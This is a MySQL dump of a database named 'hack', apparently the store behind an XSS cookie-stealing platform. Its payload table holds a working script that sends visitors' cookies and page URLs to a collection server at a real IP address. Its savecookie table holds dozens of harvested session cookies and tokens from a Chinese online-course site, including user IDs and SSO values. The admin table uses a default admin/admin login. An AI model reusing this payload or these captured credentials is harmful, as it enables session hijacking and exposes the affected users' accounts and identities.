/*
Navicat MySQL Data Transfer

Source Server         : 远程A
Source Server Version : 50041
Source Host           : 112.74.204.232:3306
Source Database       : hack

Target Server Type    : MYSQL
Target Server Version : 50041
File Encoding         : 65001

Date: 2017-12-18 10:42:50
*/

SET FOREIGN_KEY_CHECKS=0;

-- ----------------------------
-- Table structure for admin
-- ----------------------------
DROP TABLE IF EXISTS `admin`;
CREATE TABLE `admin` (
  `user` varchar(100) NOT NULL,
  `pwd` varchar(255) NOT NULL,
  `email` varchar(1000) default NULL,
  PRIMARY KEY  (`user`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='保存用户名密码';

-- ----------------------------
-- Records of admin
-- ----------------------------
INSERT INTO `admin` VALUES ('admin', 'admin', 'hlpureboy@gmail.com');

-- ----------------------------
-- Table structure for epwd
-- ----------------------------
DROP TABLE IF EXISTS `epwd`;
CREATE TABLE `epwd` (
  `id` int(100) NOT NULL auto_increment,
  `ip` varchar(100) NOT NULL,
  `port` varchar(100) NOT NULL,
  `pwd` varchar(100) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='弱口令存储';

-- ----------------------------
-- Records of epwd
-- ----------------------------

-- ----------------------------
-- Table structure for model
-- ----------------------------
DROP TABLE IF EXISTS `model`;
CREATE TABLE `model` (
  `id` int(100) NOT NULL auto_increment,
  `title` varchar(100) NOT NULL,
  `content` longtext,
  PRIMARY KEY  (`id`,`title`),
  KEY `tittle` (`title`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of model
-- ----------------------------
INSERT INTO `model` VALUES ('1', 'test', '111');
INSERT INTO `model` VALUES ('2', 'test1', '222');
INSERT INTO `model` VALUES ('3', 'pyj', '112');

-- ----------------------------
-- Table structure for payload
-- ----------------------------
DROP TABLE IF EXISTS `payload`;
CREATE TABLE `payload` (
  `title` varchar(255) NOT NULL,
  `payload` text NOT NULL,
  PRIMARY KEY  (`title`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of payload
-- ----------------------------
INSERT INTO `payload` VALUES ('cookie', '<script>(function(){\r\n	cookie=new Image();\r\n	cookie.src=\'http://112.74.204.232:8080/getxss?title=%s&href=\'+escape(document.location.href)+\'&cookie=\'+escape(document.cookie);\r\n})();</script>');

-- ----------------------------
-- Table structure for savecookie
-- ----------------------------
DROP TABLE IF EXISTS `savecookie`;
CREATE TABLE `savecookie` (
  `id` int(100) NOT NULL auto_increment,
  `title` varchar(100) NOT NULL,
  `href` varchar(255) default NULL,
  `cookie` text,
  PRIMARY KEY  (`id`),
  KEY `name` (`title`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of savecookie
-- ----------------------------
INSERT INTO `savecookie` VALUES ('1', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('2', 'test', 'http://112.74.204.232:5000/index', null);
INSERT INTO `savecookie` VALUES ('3', 'test', 'http://127.0.0.1:8080/getxssmodelname?title=cookie', '');
INSERT INTO `savecookie` VALUES ('4', 'test', 'http://127.0.0.1:8080/getxssmodelname?title=cookie', '');
INSERT INTO `savecookie` VALUES ('5', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', 'thirdRegist=0; allowJoin=84a7cd467c540bec0abaabc51a38c8fa; rt=-1; tl=0; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a16b282fa76de949afff480cbeb523406ac49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c08add89aa205fb48693505cd7377821625; _d=1513408823465; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513408823465; __dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; route=2986b6b8334020f8aa63c2624483918f');
INSERT INTO `savecookie` VALUES ('6', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', 'thirdRegist=0; allowJoin=84a7cd467c540bec0abaabc51a38c8fa; rt=-1; tl=0; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a16b282fa76de949afff480cbeb523406ac49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c08add89aa205fb48693505cd7377821625; _d=1513408823465; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513408823465; __dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; route=2986b6b8334020f8aa63c2624483918f');
INSERT INTO `savecookie` VALUES ('7', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', 'thirdRegist=0; allowJoin=84a7cd467c540bec0abaabc51a38c8fa; rt=-1; tl=0; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a16b282fa76de949afff480cbeb523406ac49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c08add89aa205fb48693505cd7377821625; _d=1513408823465; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513408823465; __dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; route=2986b6b8334020f8aa63c2624483918f');
INSERT INTO `savecookie` VALUES ('8', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', 'thirdRegist=0; allowJoin=84a7cd467c540bec0abaabc51a38c8fa; rt=-1; tl=0; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a16b282fa76de949afff480cbeb523406ac49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c08add89aa205fb48693505cd7377821625; _d=1513408823465; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513408823465; __dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; route=2986b6b8334020f8aa63c2624483918f');
INSERT INTO `savecookie` VALUES ('9', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', 'thirdRegist=0; allowJoin=84a7cd467c540bec0abaabc51a38c8fa; rt=-1; tl=0; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a16b282fa76de949afff480cbeb523406ac49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c08add89aa205fb48693505cd7377821625; _d=1513408823465; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513408823465; __dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; route=2986b6b8334020f8aa63c2624483918f');
INSERT INTO `savecookie` VALUES ('10', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018');
INSERT INTO `savecookie` VALUES ('11', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('12', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('13', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('14', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('15', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('16', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('17', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=5c5bb364-009f-433c-93ff-f272c790b5b5; route=7aaebcbdcf7cf94856c7fb5f82d77b4b; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1952820f33eafb9b55b5c968541ca6f33c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c085046bf5d3ee00b67a4cc363103c57238; _d=1513411669018; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513411669018; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('18', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', 'thirdRegist=0; allowJoin=84a7cd467c540bec0abaabc51a38c8fa; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a16b282fa76de949afff480cbeb523406ac49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c08add89aa205fb48693505cd7377821625; _d=1513408823465; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513408823465; __dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; route=2986b6b8334020f8aa63c2624483918f; fanyamoocs=B707EECD4552D9AE11401F839C536D9E; rt=-1; tl=0; platformtype=1; surveyuser=B707EECD4552D9AEDBF071A15A3D0895');
INSERT INTO `savecookie` VALUES ('19', 'test', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', 'thirdRegist=0; allowJoin=84a7cd467c540bec0abaabc51a38c8fa; fid=2098; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a16b282fa76de949afff480cbeb523406ac49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c08add89aa205fb48693505cd7377821625; _d=1513408823465; UID=25549291; DSSTASH_LOG=C_38-UN_563-US_25549291-T_1513408823465; __dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; route=2986b6b8334020f8aa63c2624483918f; fanyamoocs=B707EECD4552D9AE11401F839C536D9E; rt=-1; tl=0; platformtype=1; surveyuser=B707EECD4552D9AEDBF071A15A3D0895');
INSERT INTO `savecookie` VALUES ('20', '%s', 'http://127.0.0.1:8080/lookxssinfo?title=test', '');
INSERT INTO `savecookie` VALUES ('21', '%s', 'http://127.0.0.1:8080/lookxssinfo?title=test1', '');
INSERT INTO `savecookie` VALUES ('22', '%s', 'http://127.0.0.1:8080/lookxssinfo?title=test', '');
INSERT INTO `savecookie` VALUES ('23', 'pyj', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('24', 'pyj', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('25', 'pyj', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('26', '12', '232', 'None');
INSERT INTO `savecookie` VALUES ('27', 'pyj', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('28', 'pyj', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('29', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('30', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('31', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('32', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('33', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('34', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('35', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('36', 'test', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('37', 'pyj', 'http://112.74.204.232:5000/index', '');
INSERT INTO `savecookie` VALUES ('38', 'pyj', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1e6d85e8b990972b7004d21ebbee634a1c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c088710b47940399ea0e3716ec4f412fd16; _d=1513482304333; UID=25549291; route=2986b6b8334020f8aa63c2624483918f; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('39', 'pyj', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1e6d85e8b990972b7004d21ebbee634a1c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c088710b47940399ea0e3716ec4f412fd16; _d=1513482304333; UID=25549291; route=2986b6b8334020f8aa63c2624483918f; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('40', 'pyj', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1e6d85e8b990972b7004d21ebbee634a1c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c088710b47940399ea0e3716ec4f412fd16; _d=1513482304333; UID=25549291; route=2986b6b8334020f8aa63c2624483918f; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; rt=-2; tl=0');
INSERT INTO `savecookie` VALUES ('41', 'pyj', 'http://mooc1.chaoxing.com/schoolCourseInfo/personalnotes', '__dxca=ed28a04f-fb83-4e95-b82f-f4435bfdc105; _uid=25549291; uf=da0883eb5260151e7599b73347230355b94b80eebaa2ce35a6ef7c357bbe27a1e6d85e8b990972b7004d21ebbee634a1c49d67c0c30ca5047c5a963e85f1109952ff1d55c66d8f92ce71fc6e59483dd3b7c1c34cbef00c088710b47940399ea0e3716ec4f412fd16; _d=1513482304333; UID=25549291; route=2986b6b8334020f8aa63c2624483918f; fid=1467; thirdRegist=1; allowJoin=4eaf2b26ffa04d22cab3a89e40100bfc; web_im_hxToken=YWMt5unOnuLhEee9uMWsnWq7iqKlE4D%2d6RHksYgJxSsb8jKds8lqzZcR5o%5f1ld5ZRmaDAwMAAAFgYrWKQQBPGgB32G4NuU89eWd3A%2dMY3H8l5v8Fjolj0%2dYSvMMyT5EFmg; web_im_tid=26508660; web_im_pic=http%3a%2f%2fimg1%2e16q%2ecn%2fa56626a15a1c2cc92d0b0972e3d086ba%3f; web_im_name=%u5f6d%u82f1%u6770; KI4SO_SERVER_EC=RERFSWdRQWdsckQ0aGRFcytqcUZFcFh3ZkJXUGRhZmhRM1d0TkpGeHBnSWZNYW1nYjFEaFlzRTRD%0AQnVSVTNGRUNPdGdxMXhwZmNQNApoZEVzK2pxRkVpdTFGelp0WnY3azlqTFNCU1NmS0IvclJ1a0ZW%0AMy9nZ01FRXdUUWt5Q3dmT1hobFpoR3ZvTWcvek9kZ3N5UTlGT1NhCkJKSWRxNjRPMGdrL3Q5RVRK%0AQ1YxK09nUmVXWVFqNUFJSHAralBJd0xicUpvK002clN1UldwYTROaXU3VnpTUzczQWVka0xZWVVu%0ANlMKalRXWlcxaFNOUzQzNHFzc21RSk9sdWlwRktIdGZQMnRRQVpXTlNFUVVkS0s2dHBWRXlNU3ll%0AdlRIcVdFakVwTThVVVNQWDU3T0ZUbQpWZGgyUTZacVNvaTl5cUdpNytzSHdlWDhKS2dTWE5aaDlH%0AUVRCbkV4MXJ0QlBBSVZRZ0tTbERBRjB6TjQ0TlBISWJRUlJnRHFuRnFaCitnaUttd0dnbWY3cHpP%0AOFJnT0kyQyt6aUd1UENzakVOdzlNZEs5ektCLys1a1NheDNMNWk0RkhqVG5RWldaR3JFUVF4QWs2%0AVzZLa1UKb2UyMTQ5bXNNRG90aWVBc3VSSk9uSWpIYVdFUzJrZHN5RWM4ZE9aSnVKb2l1SGpnMDhj%0AaHRCRkdBT3FjV3BuNkNJcjJGNzVlK2RHZQptbm93VVFVSWFkaGVySXVSYVVKem41cTRneGZYZGNw%0Aay9neEtwaVRqdlRBeDNpMVQyLy9uN0o0PT9hcHBJZD0xJmtleUlkPTE%3D; _tid=26508660; sso_puid=25549291; _industry=5; rt=-2; tl=0');

-- ----------------------------
-- Table structure for sx
-- ----------------------------
DROP TABLE IF EXISTS `sx`;
CREATE TABLE `sx` (
  `id` int(100) NOT NULL auto_increment,
  `title` varchar(255) NOT NULL,
  `url` varchar(255) NOT NULL,
  PRIMARY KEY  (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- ----------------------------
-- Records of sx
-- ----------------------------
